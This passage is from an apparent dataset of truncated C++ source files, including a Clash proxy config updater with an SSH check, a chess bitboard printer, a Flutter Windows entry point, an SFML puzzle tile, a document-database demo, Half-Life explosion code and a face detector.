pipe\u7ba1\u9053\u7c7b\uff0c\u7528\u4e8e\u5728\u8fdb\u7a0b\u95f4\u901a\u8baf\uff0c\u63a5\u6536\u4e00\u4e2a\u957f\u5ea6\u4e3a2\u7684\u6570\u7ec4\u4f5c\u4e3a\u8f93\u5165\n// \u8be5\u6570\u7ec4\u4e2d 0\u4e3a\u8bfb\u53d6\u7aef\uff0c 1\u4e3a\u5199\u5165\u7aef\n// popen() \u51fd\u6570\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053\u4ee5\u4f9b\u7236\u8fdb\u7a0b\u4e0e\u5b50\u8fdb\u7a0b\u95f4\u901a\u4fe1\n//_popen, _pclose\u7528\u4e8eWindows\u73af\u5883\nstd::string execute(const char* cmd) {\n    std::array<char, 256> buffer;\n    std::string res;\n\n    // \u5728\u540e\u53f0\u521b\u5efa\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884ccmd\uff0c\u5e76\u8bfb\u53d6\u8f93\u51fa\n    // _popen\u4f1a\u8fd4\u56deFILE*\u6307\u9488\uff0c\u79bb\u5f00\u4f5c\u7528\u57df\u540e\u8c03\u7528_pclose\u5173\u95ed\u7ba1\u9053\n    std::shared_ptr<FILE> pipe(_popen(cmd, \"r\"), _pclose);\n\n    if (!pipe) throw std::runtime_error(\"Execute popen() failed!\");\n   \n    // fgets\u9010\u884c\u8bfb\u53d6\u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u4e4b\u540e\u5b58\u653e\u8fdb\u5165buffer\n    // 3 paras for fgets: char *str, int num\uff08\u5b57\u7b26\u6570\u7ec4\u5927\u5c0f\uff09, FILE *stream\n    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {\n        res += buffer.data();\n    }\n    return res;\n}\n\n// \u83b7\u53d6\u4e3b\u673a\u7684WIFI IPv4\u5730\u5740\u7684\u51fd\u6570\nstd::string getWIFIIPv4Address() {\n    std::string ipconfigOutput = execute(\"ipconfig\");\n    // \u66f4\u65b0\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u786e\u4fdd\u6b63\u786e\u5339\u914dWLAN - IPv4\u533a\u5757\u4e0b\u7684\u5730\u5740\uff08\u4e2d\u82f1\u6587\u5171\u901a\uff09\n    std::regex ipPattern(R\"(WLAN:[\\s\\S]*?IPv4[\\s\\S]*?([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}))\");\n    std::smatch ipMatched;\n\n    if (std::regex_search(ipconfigOutput, ipMatched, ipPattern)) {\n        return ipMatched[1]; // \u8fd4\u56de\u5339\u914d\u7684IPv4\u5730\u5740\uff0c[1]\u4ee3\u8868\u8fd4\u56de\u7b2c\u4e00\u4e2a\u62ec\u53f7\u5185\u7684\u503c\uff0c[0]\u4ee3\u8868\u8fd4\u56de\u6574\u4e2a\u5b57\u7b26\u4e32\n    }\n    else {\n        std::cerr << \"WIFI IPv4 match error: Cannot match target by using regular expression.\" << std::endl;\n    }\n    return \"\";\n}\n\n// \u8bfb\u53d6\u7aef\u53e3\u4fe1\u606f\nint readPortFromConfig(const std::string& configPath) {\n    std::ifstream configFile(configPath);\n    std::string line;\n    int port = -1;\n\n    if (configFile.is_open()) {\n        std::regex portPattern(R\"(mixed-port:\\s*(\\d+))\");  // \u5339\u914d mixed-port \u540e\u9762\u7684\u7aef\u53e3\u53f7\n        while (std::getline(configFile, line)) {\n            std::smatch match;\n            if (std::regex_search(line, match, portPattern) && match.size() > 1) {\n                port = std::stoi(match[1].str());\n                break;\n            }\n        }\n        configFile.close();\n    }\n    return port;\n}\n\n\n// \u66f4\u65b0Clash\u914d\u7f6e\u6587\u4ef6\nvoid updateClashConfig(const std::string& ip_address) {\n    std::string clashConfigYamlPath = PATH_TO_CLASH_CONFIG_YAML;\n    std::ifstream config_in(clashConfigYamlPath);\n    std::ofstream config_out(clashConfigYamlPath + \".temp\");\n    std::string line;\n\n    // \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914dexternal-controller\u884c\u5e76\u6355\u83b7IP\u5730\u5740\u548c\u7aef\u53e3\u53f7\n    std::regex externalControllerPattern(R\"(external-controller:\\s*(\\d+\\.\\d+\\.\\d+\\.\\d+):(\\d+))\");\n    \n    // \u6bcf\u4e2a\u62ec\u53f7\u4ee3\u8868\u5339\u914d\u7684\u90e8\u5206\uff1amatch[0]-ip:port;match[1]-ip; match[2]-port;\n    std::smatch matchedPart; \n\n    while (std::getline(config_in, line)) {\n        if (std::regex_search(line, matchedPart, externalControllerPattern)) {\n            // \u7528\u65b0\u7684IP\u5730\u5740\u66ff\u6362\u539f\u6709IP\u5730\u5740\uff0c\u4fdd\u7559\u7aef\u53e3\u53f7\n            config_out << \"external-controller: \" << ip_address << \":\" << matchedPart[2] << \"\\n\";\n        }\n        else {\n            config_out << line << \"\\n\";\n        }\n    }\n    config_in.close();\n    config_out.close();\n    if (std::remove(clashConfigYamlPath.c_str()) != 0) {\n        std::cerr << \"Failed to remove original config file.\" << std::endl;\n        return;\n    }\n    if (std::rename((clashConfigYamlPath + \".temp\").c_str(), clashConfigYamlPath.c_str()) != 0) {\n        std::cerr << \"Failed to rename temporary config file.\" << std::endl;\n        return;\n    }\n    else\n    {\n        std::cout << \"Modified config.yaml successfully!\" << '\\n';\n    }\n}\n\n\n// \u68c0\u67e5SSH\u4e0e\u865a\u62df\u673a\u7684\u901a\u4fe1\u662f\u5426\u53ef\u7528\nbool testSSHConnection(const std::string& vmIpAddr, const std::string& vmUsername) {\n\n    //ssh cs180@192.168.1.7 exit\n    std::string ssh_test_command = \"ssh \" + vmUsername + \"@\" + vmIpAddr + \" 'exit'\";\n    //std::string ssh_test_command = \"ssh -o BatchMode=yes -o ConnectTimeout=5 \" + vmUsername + \"@\" + vmIpAddr;\n    std::string output = execute(ssh_test_command.c_str());\n\n    // Check if the SSH connection test was successful (no output expected)\n    if (output.empty()) {\n        std::cout << \"\\033[1;32mSSH connection successful.\\033[0m\" << std::endl;  // Green text\n        return true;\n    }\n    else {\n        std::cerr << \"\\033[1;31mSSH connection failed: \" << output << \"\\033[0m\" << std::endl;  // Red text\n        return false;\n    }\n}\n\n\nvoid updateVMProxySettings(const std::string& ipAddr, const std::string& vmIpAddr, const std::string& vmUsername) {\n    int port = readPortFromConfig(PATH_TO_CLASH_CONFIG_YAML);\n    if (port == -1) {\n        std::cerr << \"Failed to read port from config file.\" << std::endl;\n        return;\n    }\n\n    // Test SSH connection before attempting to update settings\n    if (!testSSHConnection(vmIpAddr, vmUsername)) {\n        std::cerr << \"Cannot establish SSH connection. Aborting proxy update.\" << std::endl;\n        return;\n    }\n\n    // \u5220\u53bb\u6240\u6709\u65e7\u7684http/https/all",
    "#include <iostream>\n#include <vector>\n#include <bitset>\n\ntypedef uint64_t U64;\n\nclass Piece {\npublic:\n    char symbol;\n    U64 position;\n\n    Piece(char sym, U64 pos) : symbol(sym), position(pos) {}\n};\n\nclass WhitePawns : public Piece {\npublic:\n    WhitePawns() : Piece('P', 0x00FF000000000000) {}\n};\n\nclass WhiteRooks : public Piece {\npublic:\n    WhiteRooks() : Piece('R', 0x8100000000000000) {}\n};\n\nclass WhiteKnights : public Piece {\npublic:\n    WhiteKnights() : Piece('N', 0x4200000000000000) {}\n};\n\nclass WhiteBishops : public Piece {\npublic:\n    WhiteBishops() : Piece('B', 0x2400000000000000) {}\n};\n\nclass WhiteQueens : public Piece {\npublic:\n    WhiteQueens() : Piece('Q', 0x1000000000000000) {}\n};\n\nclass WhiteKings : public Piece {\npublic:\n    WhiteKings() : Piece('K', 0x0800000000000000) {}\n};\n\nclass BlackPawns : public Piece {\npublic:\n    BlackPawns() : Piece('p', 0x000000000000FF00) {}\n};\n\nclass BlackRooks : public Piece {\npublic:\n    BlackRooks() : Piece('r', 0x0000000000000081) {}\n};\n\nclass BlackKnights : public Piece {\npublic:\n    BlackKnights() : Piece('n', 0x0000000000000042) {}\n};\n\nclass BlackBishops : public Piece {\npublic:\n    BlackBishops() : Piece('b', 0x0000000000000024) {}\n};\n\nclass BlackQueens : public Piece {\npublic:\n    BlackQueens() : Piece('q', 0x0000000000000010) {}\n};\n\nclass BlackKings : public Piece {\npublic:\n    BlackKings() : Piece('k', 0x0000000000000008) {}\n};\n\nclass Board {\npublic:\n    std::vector<Piece> pieces;\n\n    Board(std::vector<Piece> ps) : pieces(ps) {}\n\n    void printBoard() {\n        char board[64] = { '0' };\n\n        // Place pieces on the board\n        for (const Piece& piece : pieces) {\n            for (int i = 0; i < 64; ++i) {\n                U64 mask = 1ULL << i;\n                if (piece.position & mask) {\n                    board[i] = piece.symbol;\n                }\n            }\n        }\n\n        for(int rank = 0; rank < 8; rank++) {\n            for(int file = 0; file < 8; file++) {\n                std::cout << board[rank * 8 + file] << ' ';\n            }\n            std::cout << std::endl;\n        }\n    }\n    \n};\n\nint main() {\n    WhitePawns whitePawns;\n    WhiteRooks whiteRooks;\n    WhiteKnights whiteKnights;\n    WhiteBishops whiteBishops;\n    WhiteQueens whiteQueens;\n    WhiteKings whiteKings;\n\n    BlackPawns blackPawns;\n    BlackRooks blackRooks;\n    BlackKnights blackKnights;\n    BlackBishops blackBishops;\n    BlackQueens blackQueens;\n    BlackKings blackKings;\n\n    std::vector<Piece> pieces = { whitePawns, whiteRooks, whiteKnights, whiteBishops, whiteQueens, whiteKings,\n                                  blackPawns, blackRooks, blackKnights, blackBishops, blackQueens, blackKings };\n\n    Board board(pieces);\n    board.printBoard();\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expenses\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Tile.hpp\"\r\n\r\n#include <iostream>\r\n#include <string>\r\n\r\n#include \"GlobalSettings.hpp\"\r\n#include \"SFML/Graphics/Color.hpp\"\r\n#include \"SFML/System/Vector2.hpp\"\r\n\r\nCTile::CTile(int id, int colorId, sf::Color color, sf::Vector2i coords, sf::Vector2f pos) : m_id(id), m_colorId(colorId), m_color(color), m_coords(coords), m_pos(pos), m_mark()\r\n{\r\n    // Load font\r\n    m_font.loadFromFile(std::string(GlobalSettings::FONTS_PATH) + \"arial.ttf\");\r\n}\r\n\r\nvoid CTile::Init()\r\n{\r\n    // Position\r\n    m_tile.setPosition(m_pos);\r\n\r\n    m_tile.setSize({static_cast<float>(GlobalSettings::TILE_SIZE), static_cast<float>(GlobalSettings::TILE_SIZE)});\r\n\r\n    m_tile.setOutlineThickness(1.0f);\r\n    m_tile.setOutlineColor(sf::Color::Black);\r\n\r\n    m_tile.setFillColor(m_color);\r\n\r\n    // Text\r\n    m_markText.setCharacterSize(16);\r\n    m_markText.setFillColor(sf::Color::Black);\r\n    m_markText.setStyle(sf::Text::Regular);\r\n    m_markText.setPosition(m_pos.x + (GlobalSettings::TILE_SIZE / 2) - 8, m_pos.y + (GlobalSettings::TILE_SIZE / 2 - 8));\r\n}\r\n\r\nvoid CTile::Draw(sf::RenderWindow& window)\r\n{\r\n    // Tile\r\n    window.draw(m_tile);\r\n\r\n    // Text\r\n    m_markText.setFont(m_font);\r\n    window.draw(m_markText);\r\n}\r\n\r\nbool CTile::MouseDetection(sf::Mouse::Button mouseButton, sf::Vector2i mousePos)\r\n{\r\n    sf::Vector2f mousePosFloat = sf::Vector2f(static_cast<float>(mousePos.x), static_cast<float>(mousePos.y));\r\n    if (m_tile.getGlobalBounds().contains(mousePosFloat))\r\n    {\r\n        switch (mouseButton)\r\n        {\r\n        case sf::Mouse::Button::Left:\r\n        {\r\n            if (isMarkEmpty())\r\n            {\r\n                PlaceX();\r\n            }\r\n            else if (isMarkX())\r\n            {\r\n                PlaceQueen();\r\n            }\r\n            else if (isMarkQueen())\r\n            {\r\n                ClearMark();\r\n            }\r\n\r\n            return true;\r\n        }\r\n        case sf::Mouse::Button::Right:\r\n        default:\r\n            break;\r\n        }\r\n    }\r\n\r\n    return false;\r\n}\r\n\r\nvoid CTile::SetId(int id)\r\n{\r\n    m_id = id;\r\n}\r\n\r\nint CTile::GetId() const\r\n{\r\n    return m_id;\r\n}\r\n\r\nvoid CTile::SetColorId(int colorId)\r\n{\r\n    m_colorId = colorId;\r\n}\r\n\r\nint CTile::GetColorId() const\r\n{\r\n    return m_colorId;\r\n}\r\n\r\nsf::Color CTile::GetColor() const\r\n{\r\n    return m_color;\r\n}\r\n\r\nvoid CTile::SetColor(const sf::Color& color)\r\n{\r\n    m_color = color;\r\n}\r\n\r\nvoid CTile::SetCoords(const sf::Vector2i& coords)\r\n{\r\n    m_coords = coords;\r\n}\r\n\r\nsf::Vector2i CTile::GetCoords() const\r\n{\r\n    return m_coords;\r\n}\r\n\r\nvoid CTile::SetPosition(const sf::Vector2f& pos)\r\n{\r\n    m_tile.setPosition(pos);\r\n}\r\n\r\nsf::Vector2f CTile::GetPosition() const\r\n{\r\n    return m_tile.getPosition();\r\n}\r\n\r\nvoid CTile::SetMark(const std::string &mark)\r\n{\r\n    m_mark = mark;\r\n    m_markText.setString(m_mark);\r\n}\r\n\r\nstd::string CTile::GetMark() const\r\n{\r\n    return m_mark;\r\n}\r\n\r\nsf::Vector2f CTile::GetSize() const\r\n{\r\n    return m_tile.getSize();\r\n}\r\n\r\nbool CTile::isMarkEmpty() const\r\n{\r\n    return m_mark.empty();\r\n}\r\n\r\nbool CTile::isMarkX() const\r\n{\r\n    return m_mark == \"X\";\r\n}\r\n\r\nbool CTile::isMarkQueen() const\r\n{\r\n    return m_mark == \"Q\";\r\n}\r\n\r\nvoid CTile::ClearMark()\r\n{\r\n    m_mark.clear();\r\n    m_markText.setString(m_mark);\r\n    m_markText.setStyle(sf::Text::Regular);\r\n}\r\n\r\nvoid CTile::PlaceX()\r\n{\r\n    m_mark = \"X\";\r\n    m_markText.setString(m_mark);\r\n    m_markText.setStyle(sf::Text::Regular);\r\n}\r\n\r\nvoid CTile::PlaceQueen()\r\n{\r\n    m_mark = \"Q\";\r\n    m_markText.setString(m_mark);\r\n    m_markText.setStyle(sf::Text::Bold);\r\n}\r\n\r\n// -------\r\n\r\nstd::ostream& operator<<(std::ostream& os, const CTile& tile)\r\n{\r\n    os << \"Tile\" << std::endl;\r\n    os << \"Id: \" << tile.GetId() << std::endl;\r\n    os << \"Color Id: \" << tile.GetColorId() << std::endl;\r\n    os << \"Color: \" << tile.GetColor().toInteger() << std::endl; // TODO: toString()\r\n    os << \"Coords.: [\" << tile.GetCoords().x << \", \" << tile.GetCoords().y << \"]\" << std::endl;\r\n    os << std::endl;\r\n\r\n    return os;\r\n}\r\n",
    "#include <iostream>\r\n#include <limits> // Include this header for std::numeric_limits\r\n#include <vector>\r\n#include <map>\r\n#include <stdexcept>\r\n#include <string>\r\n#include \"Database.h\"\r\n#include \"Encryption.h\"\r\n\r\n// Function to display the menu\r\nvoid showMenu() {\r\n    std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"1. Create Collection\" << std::endl;\r\n    // std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"2. Add Document to Collection\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"3. Retrieve Documents from Collection\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"4. Update Document in Collection\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"5. Delete Document from Collection\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"6. List Collections\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"7. List Documents in Collection\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"8. Encrypt Document\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"9. Decrypt Document\" << std::endl;\r\n    //  std::cout << \"---------------------------\" << std::endl;\r\n    std::cout << \"10. Exit\" << std::endl;\r\n     std::cout << \"---------------------------\" << std::endl;\r\n}\r\n\r\n// Function to handle invalid input\r\nvoid handleInvalidInput() {\r\n    std::cin.clear(); // Clear error flag\r\n    std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n'); // Discard invalid input\r\n}\r\n\r\n// Function to check if a collection exists\r\nbool collectionExists(Database& db, const std::string& collectionName) {\r\n    std::vector<std::string> collections = db.listCollections(\"user1\");\r\n    for (const auto& name : collections) {\r\n        if (name == collectionName) {\r\n            return true;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nint main() {\r\n    Database db;\r\n    try {\r\n        db.registerUser(\"user1\", \"password123\");\r\n        if (db.loginUser(\"user1\", \"password123\")) {\r\n             std::cout << \"---------------------------\" << std::endl;\r\n            std::cout << \"Login successful!\" << std::endl;\r\n\r\n            int choice;\r\n            std::string collectionName, key, value;\r\n            size_t docIndex;\r\n            Document doc;\r\n            int shift;\r\n\r\n            while (true) {\r\n                showMenu();\r\n                std::cin >> choice;\r\n\r\n                if (std::cin.fail()) {\r\n                    handleInvalidInput();\r\n                    std::cout << \"Invalid input. Please enter a number.\" << std::endl;\r\n                    continue;\r\n                }\r\n\r\n                switch (choice) {\r\n                    case 1:\r\n                        std::cout << \"Enter collection name: \";\r\n                        std::cin >> collectionName;\r\n                        db.addCollection(\"user1\", collectionName);\r\n                        break;\r\n                    case 2:\r\n                        std::cout << \"Enter collection name: \";\r\n                        std::cin >> collectionName;\r\n                        if (!collectionExists(db, collectionName)) {\r\n                            std::cout << \"Collection not found.\" << std::endl;\r\n                            break;\r\n                        }\r\n                        doc.data.clear();\r\n                        std::cout << \"Enter key-value pairs (key value). Enter 'done' to finish: \";\r\n                        while (std::cin >> key && key != \"done\") {\r\n                            std::cin >> value;\r\n                            doc.data[key] = value;\r\n                        }\r\n                        db.addDocument(\"user1\", collectionName, doc);\r\n                        break;\r\n                    case 3:\r\n                        std::cout << \"Enter collection name: \";\r\n                        std::cin >> collectionName;\r\n                        if (!collectionExists(db, collectionName)) {\r\n                            std::cout << \"Collection not found.\" << std::endl;\r\n                            break;\r\n                        }\r\n                        for (const auto& d : db.getDocuments(\"user1\", collectionName)) {\r\n                            for (const auto& pair : d.data) {\r\n                                std::cout << pair.first << \": \" << pair.second << std::endl;\r\n                            }\r\n                        }\r\n                        break;\r\n                    case 4:\r\n                        std::cout << \"Enter collection name: \";\r\n                        std::cin >> collectionName;\r\n                        if (!collectionExists(db, collectionName)) {\r\n                            std::cout << \"Collection not found.\" << std::endl;\r\n                      ",
    "/***\n*\n*\tCopyright (c) 1999, 2000 Valve LLC. All rights reserved.\n*\t\n*\tThis product contains software technology licensed from Id \n*\tSoftware, Inc. (\"Id Technology\").  Id Technology (c) 1996 Id Software, Inc. \n*\tAll Rights Reserved.\n*\n*   Use, distribution, and modification of this source code and/or resulting\n*   object code is restricted to non-commercial enhancements to products from\n*   Valve LLC.  All other use, distribution, or modification is prohibited\n*   without written permission from Valve LLC.\n*\n****/\n/*\n\n===== explode.cpp ========================================================\n\n  Explosion-related code\n\n*/\n#include \"extdll.h\"\n#include \"util.h\"\n#include \"cbase.h\"\n#include \"decals.h\"\n#include \"explode.h\"\n\n// Spark Shower\nclass CShower : public CBaseEntity\n{\n\tvoid Spawn( void );\n\tvoid Think( void );\n\tvoid Touch( CBaseEntity *pOther );\n\tint ObjectCaps( void ) { return FCAP_DONT_SAVE; }\n};\n\nLINK_ENTITY_TO_CLASS( spark_shower, CShower );\n\nvoid CShower::Spawn( void )\n{\n\tpev->velocity = RANDOM_FLOAT( 200, 300 ) * pev->angles;\n\tpev->velocity.x += RANDOM_FLOAT(-100.f,100.f);\n\tpev->velocity.y += RANDOM_FLOAT(-100.f,100.f);\n\tif ( pev->velocity.z >= 0 )\n\t\tpev->velocity.z += 200;\n\telse\n\t\tpev->velocity.z -= 200;\n\tpev->movetype = MOVETYPE_BOUNCE;\n\tpev->gravity = 0.5;\n\tpev->nextthink = gpGlobals->time + 0.1;\n\tpev->solid = SOLID_NOT;\n\tSET_MODEL( edict(), \"models/grenade.mdl\");\t// Need a model, just use the grenade, we don't draw it anyway\n\tUTIL_SetSize(pev, g_vecZero, g_vecZero );\n\tpev->effects |= EF_NODRAW;\n\tpev->speed = RANDOM_FLOAT( 0.5, 1.5 );\n\n\tpev->angles = g_vecZero;\n}\n\n\nvoid CShower::Think( void )\n{\n\tUTIL_Sparks( pev->origin );\n\n\tpev->speed -= 0.1;\n\tif ( pev->speed > 0 )\n\t\tpev->nextthink = gpGlobals->time + 0.1;\n\telse\n\t\tUTIL_Remove( this );\n\tpev->flags &= ~FL_ONGROUND;\n}\n\nvoid CShower::Touch( CBaseEntity *pOther )\n{\n\tif ( pev->flags & FL_ONGROUND )\n\t\tpev->velocity = pev->velocity * 0.1;\n\telse\n\t\tpev->velocity = pev->velocity * 0.6;\n\n\tif ( (pev->velocity.x*pev->velocity.x+pev->velocity.y*pev->velocity.y) < 10.0 )\n\t\tpev->speed = 0;\n}\n\nclass CEnvExplosion : public CBaseMonster\n{\npublic:\n\tvoid Spawn( );\n\tvoid EXPORT Smoke ( void );\n\tvoid KeyValue( KeyValueData *pkvd );\n\tvoid Use( CBaseEntity *pActivator, CBaseEntity *pCaller, USE_TYPE useType, float value );\n\n\tvirtual int\t\tSave( CSave &save );\n\tvirtual int\t\tRestore( CRestore &restore );\n\tstatic\tTYPEDESCRIPTION m_SaveData[];\n\n\tint m_iMagnitude;// how large is the fireball? how much damage?\n\tint m_spriteScale; // what's the exact fireball sprite scale? \n};\n\nTYPEDESCRIPTION\tCEnvExplosion::m_SaveData[] = \n{\n\tDEFINE_FIELD( CEnvExplosion, m_iMagnitude, FIELD_INTEGER ),\n\tDEFINE_FIELD( CEnvExplosion, m_spriteScale, FIELD_INTEGER ),\n};\n\nIMPLEMENT_SAVERESTORE( CEnvExplosion, CBaseMonster );\nLINK_ENTITY_TO_CLASS( env_explosion, CEnvExplosion );\n\nvoid CEnvExplosion::KeyValue( KeyValueData *pkvd )\n{\n\tif (FStrEq(pkvd->szKeyName, \"iMagnitude\"))\n\t{\n\t\tm_iMagnitude = atoi(pkvd->szValue);\n\t\tpkvd->fHandled = TRUE;\n\t}\n\telse\n\t\tCBaseEntity::KeyValue( pkvd );\n}\n\nvoid CEnvExplosion::Spawn( void )\n{ \n\tpev->solid = SOLID_NOT;\n\tpev->effects = EF_NODRAW;\n\n\tpev->movetype = MOVETYPE_NONE;\n\t/*\n\tif ( m_iMagnitude > 250 )\n\t{\n\t\tm_iMagnitude = 250;\n\t}\n\t*/\n\n\tfloat flSpriteScale;\n\tflSpriteScale = ( m_iMagnitude - 50) * 0.6;\n\t\n\t/*\n\tif ( flSpriteScale > 50 )\n\t{\n\t\tflSpriteScale = 50;\n\t}\n\t*/\n\tif ( flSpriteScale < 10 )\n\t{\n\t\tflSpriteScale = 10;\n\t}\n\n\tm_spriteScale = (int)flSpriteScale;\n}\n\nvoid CEnvExplosion::Use( CBaseEntity *pActivator, CBaseEntity *pCaller, USE_TYPE useType, float value )\n{ \n\tTraceResult tr;\n\n\tpev->model = iStringNull;//invisible\n\tpev->solid = SOLID_NOT;// intangible\n\n\tVector\t\tvecSpot;// trace starts here!\n\n\tvecSpot = pev->origin + Vector ( 0 , 0 , 8 );\n\t\n\tUTIL_TraceLine ( vecSpot, vecSpot + Vector ( 0, 0, -40 ),  ignore_monsters, ENT(pev), & tr);\n\t\n\t// Pull out of the wall a bit\n\tif ( tr.flFraction != 1.0 )\n\t{\n\t\tpev->origin = tr.vecEndPos + (tr.vecPlaneNormal * (m_iMagnitude - 24) * 0.6);\n\t}\n\telse\n\t{\n\t\tpev->origin = pev->origin;\n\t}\n\n\t// draw decal\n\tif (! ( pev->spawnflags & SF_ENVEXPLOSION_NODECAL))\n\t{\n\t\tif ( RANDOM_FLOAT( 0 , 1 ) < 0.5 )\n\t\t{\n\t\t\tUTIL_DecalTrace( &tr, DECAL_SCORCH1 );\n\t\t}\n\t\telse\n\t\t{\n\t\t\tUTIL_DecalTrace( &tr, DECAL_SCORCH2 );\n\t\t}\n\t}\n\n\t// draw fireball\n\tif ( !( pev->spawnflags & SF_ENVEXPLOSION_NOFIREBALL ) )\n\t{\n\t\tMESSAGE_BEGIN( MSG_PAS, SVC_TEMPENTITY, pev->origin );\n\t\t\tWRITE_BYTE( TE_EXPLOSION);\n\t\t\tWRITE_COORD( pev->origin.x );\n\t\t\tWRITE_COORD( pev->origin.y );\n\t\t\tWRITE_COORD( pev->origin.z );\n\t\t\tWRITE_SHORT( g_sModelIndexFireball );\n\t\t\tWRITE_BYTE( (BYTE)m_spriteScale ); // scale * 10\n\t\t\tWRITE_BYTE( 15  ); // framerate\n\t\t\tWRITE_BYTE( TE_EXPLFLAG_NONE );\n\t\tMESSAGE_END();\n\t}\n\telse\n\t{\n\t\tMESSAGE_BEGIN( MSG_PAS, SVC_TEMPENTITY, pev->origin );\n\t\t\tWRITE_BYTE( TE_EXPLOSION);\n\t\t\tWRITE_COORD( pev->origin.x );\n\t\t\tWRITE_COORD( pev->origin.y );\n\t\t\tWRITE_COORD( pev->origin.z );\n\t\t\tWRITE_SHORT( g_sModelIndexFireball );\n\t\t\tWRITE_BYTE( 0 ); // no sprite\n\t\t\tWRITE_BYTE( 15  ); // framer",
    "/**\n ******************************************************************************\n * @file           : face_detector_yunet.cpp\n * @author         : CodingRookie\n * @brief          : None\n * @attention      : None\n * @date           : 24-7-16\n ******************************************************************************\n */\n\n#include \"face_detector_yunet.h\"\n\nnamespace Ffc {\nFaceDetectorYunet::FaceDetectorYunet(const std::shared_ptr<Ort::Env> &env,\n                                     const std::shared_ptr<const nlohmann::json> &modelsInfoJson) :\n    OrtSession(env), m_modelsInfoJson(modelsInfoJson) {\n    std::string modelPath = m_modelsInfoJson->at(\"faceAnalyserModels\").at(\"face_detector_yunet\").at(\"path\");\n\n    if (!FileSystem::fileExists(modelPath)) {\n        bool downloadSuccess = Downloader::download(m_modelsInfoJson->at(\"faceAnalyserModels\").at(\"face_detector_yunet\").at(\"url\"),\n                                                    \"./models\");\n        if (!downloadSuccess) {\n            throw std::runtime_error(\"Failed to download the model file: \" + modelPath);\n        }\n    }\n    m_faceDetectorYN = cv::FaceDetectorYN::create(modelPath, \"\", cv::Size(0, 0));\n}\n\nstd::shared_ptr<std::tuple<std::vector<Typing::BoundingBox>,\n                           std::vector<Typing::FaceLandmark>,\n                           std::vector<Typing::Score>>>\nFaceDetectorYunet::detect(const VisionFrame &visionFrame, const cv::Size &faceDetectorSize,\n                          const float &scoreThreshold) {\n    const int faceDetectorHeight = faceDetectorSize.height;\n    const int faceDetectorWidth = faceDetectorSize.width;\n\n    auto inputVisionFrame = Vision::resizeFrameResolution(visionFrame, cv::Size(faceDetectorWidth, faceDetectorHeight));\n    const int ratioHeight = (float)visionFrame.rows / (float)inputVisionFrame.rows;\n    const int ratioWidth = (float)visionFrame.cols / (float)inputVisionFrame.cols;\n    const int inputHeight = inputVisionFrame.rows;\n    const int inputWidth = inputVisionFrame.cols;\n    \n    cv::Mat output;\n    {\n        static std::mutex mtx;\n        std::lock_guard<std::mutex> lock(mtx);\n        m_faceDetectorYN->setInputSize(cv::Size(inputWidth, inputHeight));\n        m_faceDetectorYN->setScoreThreshold(scoreThreshold);\n        m_faceDetectorYN->detect(inputVisionFrame, output);\n    }\n\n    std::vector<Typing::BoundingBox> resultBoundingBoxes;\n    std::vector<Typing::FaceLandmark> resultFaceLandmarks;\n    std::vector<Typing::Score> resultScores;\n    for (size_t i = 0; i < output.rows; ++i) {\n        Typing::BoundingBox tempBbox;\n        tempBbox.xmin = output.at<float>(i, 0) * ratioWidth;\n        tempBbox.ymin = output.at<float>(i, 1) * ratioHeight;\n        tempBbox.xmax = (output.at<float>(i, 0) + output.at<float>(i, 2)) * ratioWidth;\n        tempBbox.ymax = (output.at<float>(i, 1) + output.at<float>(i, 3)) * ratioWidth;\n        resultBoundingBoxes.emplace_back(tempBbox);\n\n        Typing::FaceLandmark tempLandmark;\n        for (size_t j = 4; j < 14; j += 2) {\n            cv::Point2f tempPoint;\n            tempPoint.x = output.at<float>(i, j) * ratioWidth;\n            tempPoint.y = output.at<float>(i, j + 1) * ratioHeight;\n            tempLandmark.emplace_back(tempPoint);\n        }\n        resultFaceLandmarks.emplace_back(tempLandmark);\n\n        resultScores.emplace_back(output.at<float>(i, 14));\n    }\n\n    return std::make_shared<std::tuple<std::vector<Typing::BoundingBox>,\n                                       